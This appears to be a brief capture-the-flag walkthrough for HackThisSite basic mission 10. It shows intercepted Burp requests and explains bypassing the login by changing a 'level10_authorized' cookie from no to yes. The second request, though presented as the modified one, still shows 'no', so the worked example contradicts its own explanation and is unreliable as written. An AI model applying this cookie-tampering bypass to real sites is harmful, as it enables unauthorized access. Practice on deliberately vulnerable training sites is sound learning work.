So the challenge is only showing password field nothing written nothing in source code 

but when we put any password and intercept the request using burp we found this header
```text
POST /missions/basic/10/index.php HTTP/1.1
Host: www.hackthissite.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://www.hackthissite.org/missions/basic/10/
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Cookie: level10_authorized=no; _pk_id.1.1039=698497548ef239b8.1520769090.2.1520861954.1520861653.; PHPSESSID=picgn6dtvjl7hki6kkp3ukind6; _pk_ses.1.1039=*
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

password=asd
```
where **level10_authorized=no** is set to no , now if we change this to yes we will solve the challenge just send any random password
and change the **level10_authorized=yes** and we are good to go

```
POST /missions/basic/10/index.php HTTP/1.1
Host: www.hackthissite.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://www.hackthissite.org/missions/basic/10/
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Cookie: level10_authorized=no; _pk_id.1.1039=698497548ef239b8.1520769090.2.1520861954.1520861653.; PHPSESSID=picgn6dtvjl7hki6kkp3ukind6; _pk_ses.1.1039=*
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

password=qwe
```
